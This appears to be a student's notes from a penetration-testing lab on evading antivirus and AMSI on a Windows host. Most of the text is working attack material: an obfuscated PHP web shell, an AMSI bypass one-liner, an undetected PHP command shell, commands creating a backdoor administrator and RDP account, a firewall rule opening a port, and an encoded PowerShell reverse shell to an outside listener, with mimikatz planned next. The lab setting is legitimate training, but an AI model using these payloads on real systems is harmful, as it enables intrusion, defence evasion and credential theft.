
Let's 1st try what we have learnt in wreath network and if it doesn't work will learn what they are teaching us.

Let's try this obfuscation
https://www.gaijin.at/en/tools/php-obfuscator
```
<?php system($_GET[base64_decode('Y21k')]);?>
```


As i was going through this Php obfuscation won't work so will have to learn something on the lines of either updating amsi.dll or obfuscate it aka AMSIception.



<hr>



There are a large number of bypasses for AMSI available, a majority written in PowerShell and C#. Find a list of common bypasses below.  

https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell

- Patching amsi.dll
- Amsi ScanBuffer patch
- Forcing errors
- Matt Graeber's Reflection, [](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)[https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/](https://www.mdsec.co.uk/2018/06/exploring-powershell-amsi-and-logging-evasion/)
- PowerShell downgrade



<hr>


Will Target `Matt Graeber` reflection method as well as patching `amsi.dll`

```
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```

##  It is helpful to think of obfuscation as an art rather than a technique.


To Begin with Obfuscation will focus on manual obfuscation more as it's more reliable compared to automated obfuscators.

To aid in our obfuscation efforts, we will use the AMSITrigger script, [https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger), written by RythmStick


Automated obfuscators like Invoke-Obfuscation and ISE-Steroids to perform advanced string and signature manipulation.  

We again recommend using a development virtual machine to test and edit code.


When creating a token command, you will need to be careful not to obfuscate the payload too much and exceed the 8191 character limit in a Windows command prompt.


## So instead of all this will try this shell

![[Pasted image 20240825202530.png]]

Normal Payload
```
php system($_GET[base64_decode('Y21k')]);?>
```
It gets deleted as soon as we try to execute it. 


Payload that is not detected by AV
```
<html>
<body>
<form method="GET" name="<?php echo basename($_SERVER['PHP_SELF']); ?>">
<input type="TEXT" name="cmd" autofocus id="cmd" size="80">
<input type="SUBMIT" value="Execute">
</form>
<pre>
<?php
    if(isset($_GET['cmd']))
    {
        system($_GET['cmd']);
    }
?>
</pre>
</body>
</html>
```


But not able to get the reverse shell which means we have to stop the AV first and than we are good to go.
Let's try to kill the windows defender
![[Pasted image 20240829023638.png]]

So not able to kill it but why not add a user and get a rdp instead and than kill the AV ourself.

```
net user /add sardarji  password
```

```
net localgroup administrators sardarji /add
```

```
net localgroup remotedesktopusers sardarji /add
```


So it's time to check if the user was created successfully aka Login time
```
crackmapexec smb 10.201.11.31 -u sardarji -p password --local-auth
```
![[Pasted image 20240829024821.png]]


It's time to check if we can RDP or not !!!!
```
xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:10.201.11.31 /u:sardarji /p:'password'
```
![[Pasted image 20240829025109.png]]

So instead of trying to bypass the AV this is another way we can come in without kocking on the DOOR.

![[Pasted image 20240829025257.png]]


Let's try to get the Reverse Shell now
opened a specific port to pass the traffic through
```
netsh advfirewall firewall add rule name="Open Port 44444" protocol=TCP dir=in localport=44444 action=allow
```

no need to open the port i have given the wrong port in the input
```
powershell%20-nop%20-c%20%22%24client%20%3D%20New-Object%20System.Net.Sockets.TCPClient%28%2710.51.9.13%27%2C4444%29%3B%24stream%20%3D%20%24client.GetStream%28%29%3B%5Bbyte%5B%5D%5D%24bytes%20%3D%200..65535%7C%25%7B0%7D%3Bwhile%28%28%24i%20%3D%20%24stream.Read%28%24bytes%2C%200%2C%20%24bytes.Length%29%29%20-ne%200%29%7B%3B%24data%20%3D%20%28New-Object%20-TypeName%20System.Text.ASCIIEncoding%29.GetString%28%24bytes%2C0%2C%20%24i%29%3B%24sendback%20%3D%20%28iex%20%24data%202%3E%261%20%7C%20Out-String%20%29%3B%24sendback2%20%3D%20%24sendback%20%2B%20%27PS%20%27%20%2B%20%28pwd%29.Path%20%2B%20%27%3E%20%27%3B%24sendbyte%20%3D%20%28%5Btext.encoding%5D%3A%3AASCII%29.GetBytes%28%24sendback2%29%3B%24stream.Write%28%24sendbyte%2C0%2C%24sendbyte.Length%29%3B%24stream.Flush%28%29%7D%3B%24client.Close%28%29%22
```

SO i was right AV was not letting us to get the rev shell.


Next target is AD aka .30 and .35 both are Windows server and will see how to get into them
but before that will run mimikatz via the RDP we get.

